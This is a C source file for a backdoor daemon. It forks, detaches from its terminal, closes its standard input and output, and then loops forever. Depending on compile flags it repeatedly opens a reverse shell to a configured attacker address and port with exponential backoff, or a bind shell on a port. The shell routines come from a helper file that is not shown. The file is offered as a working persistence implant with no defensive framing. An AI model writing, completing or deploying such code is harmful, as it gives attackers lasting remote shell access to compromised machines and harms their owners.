#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>

#include "helper.h"

int main(void)
{

    /* Our process ID and Session ID */
    pid_t pid, sid;
    int status = 0;

    /* Fork off the parent process */
    pid = fork();
    if (pid < 0)
    {
        exit(EXIT_FAILURE);
    }
    /* If we got a good PID, then
           we can exit the parent process. */
    if (pid > 0)
    {
        while ((pid = wait(&status)) > 0)
        {
            //TODO: add respawning capabilities to the parent
            my_printf("The child job has finished\n");
        }
        // wait(0);
        exit(EXIT_SUCCESS);
    }

    /* Create a new SID for the child process */
    sid = setsid();
    if (sid < 0)
    {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Change the current working directory */
    if ((chdir("/")) < 0)
    {
        /* Log the failure */
        exit(EXIT_FAILURE);
    }

    /* Close out the standard file descriptors */
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    /* Daemon-specific initialization goes here */
    int loopcnt = 1;

    /* The Big Loop */
    while (1)
    {
        /* Set up the reverse shell and sleep exponentially longer if no connections successful*/
#ifdef REVSH
        // my_printf("Reverse shell to %s on port %d", REVIP, PORT)
        revsh(REVIP, PORT);
        sleep(loopcnt); /* wait 30 seconds */
        loopcnt *= 2;
#endif

        /* Set up the bind shell code */
#ifdef BINDSH
        // my_printf("Bind shell on port %d", PORT)
        bindsh(PORT);
        sleep(30); /* wait 30 seconds */
#endif
    }

    my_printf("yolo mfs");
    exit(EXIT_SUCCESS);
}